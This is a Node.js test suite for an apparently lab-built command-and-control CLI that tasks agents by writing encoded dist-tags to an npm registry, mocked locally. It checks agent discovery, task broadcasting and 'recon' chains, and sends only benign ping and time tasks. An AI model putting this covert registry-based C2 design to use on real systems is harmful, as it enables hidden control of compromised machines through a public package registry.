import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { decodeCommandTag, encodeAnnounceTag, encodeCommandTag } from '../src/common/protocol.js';

const PROJECT_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

function runCli(args, input, env) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, args, {
      cwd: PROJECT_ROOT,
      env,
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    let stdout = '';
    let stderr = '';
    const timeout = setTimeout(() => {
      child.kill('SIGKILL');
      reject(new Error(`CLI timed out\nstdout:\n${stdout}\nstderr:\n${stderr}`));
    }, 5_000);

    child.stdout.on('data', (chunk) => { stdout += chunk; });
    child.stderr.on('data', (chunk) => { stderr += chunk; });
    child.on('error', reject);
    child.on('close', (code) => {
      clearTimeout(timeout);
      resolve({ code, stdout, stderr });
    });
    child.stdin.end(input);
  });
}

test('CLI uses historical discovery, rejects unknown direct targets, and sends one broadcast', async (t) => {
  const agentId = 'agent1';
  const oldHeartbeat = encodeAnnounceTag(agentId, {
    ts: 9_999_999_999_999,
    host: 'clock-ahead',
    cwd: '/lab',
    lease: 'legacy-lease',
  });
  const existingBroadcast = encodeCommandTag('all', 4, { op: 'ping', ts: 1 });
  const tags = {
    latest: '1.0.0',
    [oldHeartbeat]: '1.0.0',
    [existingBroadcast]: '1.0.0',
  };
  const commandWrites = [];

  const server = http.createServer((req, res) => {
    res.setHeader('content-type', 'application/json');
    if (req.method === 'GET') {
      res.end(JSON.stringify(tags));
      return;
    }
    if (req.method === 'PUT') {
      const tag = decodeURIComponent(req.url.split('/').at(-1));
      commandWrites.push(decodeCommandTag(tag));
      tags[tag] = '1.0.0';
      res.end('{}');
      return;
    }
    res.statusCode = 405;
    res.end('{}');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-cli-'));
  const stateFile = path.join(tmp, 'attacker-state.json');
  const configFile = path.join(tmp, 'config.json');
  fs.writeFileSync(configFile, JSON.stringify({
    registryUrl: `http://127.0.0.1:${server.address().port}`,
    packageName: 'lab-package',
    pollIntervalSec: 10,
    stateFile,
  }));

  const env = {
    ...process.env,
    NPM_C2_ENV_FILE: path.join(tmp, 'missing-env.sh'),
    NPM_C2_REGISTRY_URL: `http://127.0.0.1:${server.address().port}`,
    NPM_C2_PACKAGE_NAME: 'lab-package',
    NPM_C2_POLL_INTERVAL: '10',
    NPM_C2_STATE_FILE: stateFile,
    NPM_C2_TOKEN: 'test-token',
  };
  const result = await runCli(
    ['src/attacker/cli.js', '--config', configFile],
    `agents\ntask missing ping\ntask ${agentId} ping\ntask all ping\nagents\nexit\n`,
    env,
  );

  assert.equal(result.code, 0, result.stderr || result.stdout);
  assert.match(result.stdout, /agent1\s+known/);
  assert.doesNotMatch(result.stdout, /clock-ahead|\/lab|online|offline|unknown/);
  assert.match(result.stdout, /agent "missing" is not known; task not sent/);
  assert.match(result.stdout, /sent: task #5 ping -> agent1/);
  assert.match(result.stdout, /sent: task #6 ping -> all/);
  assert.equal(commandWrites.length, 2);
  assert.deepEqual(commandWrites.map(({ agentId: target, seq }) => [target, seq]), [
    [agentId, 5],
    ['all', 6],
  ]);
  assert.deepEqual(commandWrites.map(({ payload }) => payload.lease), [undefined, undefined]);
});

test('CLI polling preserves locally sent commands beyond the legacy task TTL', async (t) => {
  const agentId = 'agent1';
  const sentAt = Date.now() - 121_000;
  const command = encodeCommandTag(agentId, 7, { op: 'ping', args: {}, ts: sentAt });
  const tags = {
    latest: '1.0.0',
    [command]: '1.0.0',
  };
  const deletedTags = [];

  const server = http.createServer((req, res) => {
    res.setHeader('content-type', 'application/json');
    if (req.method === 'GET') {
      res.end(JSON.stringify(tags));
      return;
    }
    if (req.method === 'DELETE') {
      const tag = decodeURIComponent(req.url.split('/').at(-1));
      deletedTags.push(tag);
      delete tags[tag];
      res.end('{}');
      return;
    }
    res.statusCode = 405;
    res.end('{}');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-cli-'));
  const stateFile = path.join(tmp, 'attacker-state.json');
  const configFile = path.join(tmp, 'config.json');
  const registryUrl = `http://127.0.0.1:${server.address().port}`;
  fs.writeFileSync(stateFile, JSON.stringify({
    nextSeq: { [agentId]: 7 },
    sent: 1,
    received: 0,
    perAgent: {},
    seenResults: [],
    agents: [agentId],
    history: [{
      dir: 'out',
      ts: sentAt,
      target: agentId,
      seq: 7,
      op: 'ping',
      args: {},
      tag: command,
    }],
  }));
  fs.writeFileSync(configFile, JSON.stringify({
    registryUrl,
    packageName: 'lab-package',
    pollIntervalSec: 10,
    stateFile,
  }));

  const env = {
    ...process.env,
    NPM_C2_ENV_FILE: path.join(tmp, 'missing-env.sh'),
    NPM_C2_REGISTRY_URL: registryUrl,
    NPM_C2_PACKAGE_NAME: 'lab-package',
    NPM_C2_POLL_INTERVAL: '10',
    NPM_C2_STATE_FILE: stateFile,
    NPM_C2_TOKEN: 'test-token',
  };
  const result = await runCli(
    ['src/attacker/cli.js', '--config', configFile],
    'poll\nexit\n',
    env,
  );

  assert.equal(result.code, 0, result.stderr || result.stdout);
  assert.deepEqual(deletedTags, [], 'polling must not reap an unconsumed local command by age');
  assert.equal(tags[command], '1.0.0');
});

test('CLI chain: flag-based add, run against a given agent, legacy migration', async (t) => {
  const agentId = 'agent1';
  const announce = encodeAnnounceTag(agentId, {
    ts: 9_999_999_999_999,
    host: 'h',
    cwd: '/lab',
    lease: 'legacy-lease',
  });
  const tags = { latest: '1.0.0', [announce]: '1.0.0' };
  const commandWrites = [];

  const server = http.createServer((req, res) => {
    res.setHeader('content-type', 'application/json');
    if (req.method === 'GET') {
      res.end(JSON.stringify(tags));
      return;
    }
    if (req.method === 'PUT') {
      const tag = decodeURIComponent(req.url.split('/').at(-1));
      commandWrites.push(decodeCommandTag(tag));
      tags[tag] = '1.0.0';
      res.end('{}');
      return;
    }
    res.statusCode = 405;
    res.end('{}');
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'npm-c2-cli-'));
  const stateFile = path.join(tmp, 'attacker-state.json');
  const chainFile = path.join(tmp, 'chains.json');
  const legacyFile = path.join(tmp, 'playbooks.json');
  const configFile = path.join(tmp, 'config.json');
  // legacy store from the playbook era: migrates on first chain use
  fs.writeFileSync(legacyFile, JSON.stringify({ warmup: [`task ${agentId} ping`] }));
  fs.writeFileSync(configFile, JSON.stringify({
    registryUrl: `http://127.0.0.1:${server.address().port}`,
    packageName: 'lab-package',
    pollIntervalSec: 10,
    stateFile,
  }));

  const env = {
    ...process.env,
    NPM_C2_ENV_FILE: path.join(tmp, 'missing-env.sh'),
    NPM_C2_REGISTRY_URL: `http://127.0.0.1:${server.address().port}`,
    NPM_C2_PACKAGE_NAME: 'lab-package',
    NPM_C2_POLL_INTERVAL: '10',
    NPM_C2_STATE_FILE: stateFile,
    NPM_C2_TOKEN: 'test-token',
  };
  const result = await runCli(
    ['src/attacker/cli.js', '--config', configFile],
    [
      'chain list',
      'chain add -n recon -s "ping" -s "time"',
      'chain list',
      'chain list recon',
      'chain run recon -a agent1',
      'chain delete recon',
      'exit',
      '',
    ].join('\n'),
    env,
  );

  assert.equal(result.code, 0, result.stderr || result.stdout);
  assert.match(result.stdout, /migrated playbooks\.json -> chains\.json/);
  assert.match(result.stdout, /warmup\s+1 step\(s\)/);
  assert.match(result.stdout, /added chain recon \(2 step\(s\)/);
  assert.match(result.stdout, /recon\s+2 step\(s\)/);
  assert.match(result.stdout, /1\. ping/);
  assert.match(result.stdout, /running chain "recon" against agent1 \(2 steps\)/);
  assert.match(result.stdout, /sent: task #1 ping -> agent1/);
  assert.match(result.stdout, /sent: task #2 time -> agent1/);
  assert.match(result.stdout, /deleted chain recon/);
  assert.deepEqual(commandWrites.map(({ agentId: target, seq, payload }) => [target, seq, payload.op]), [
    [agentId, 1, 'ping'],
    [agentId, 2, 'time'],
  ]);
  // delete leaves the migrated chain behind in a valid store
  assert.deepEqual(JSON.parse(fs.readFileSync(chainFile, 'utf8')), { warmup: ['ping'] });
  assert.ok(fs.existsSync(`${legacyFile}.bak`), 'legacy playbook file kept as .bak');
});
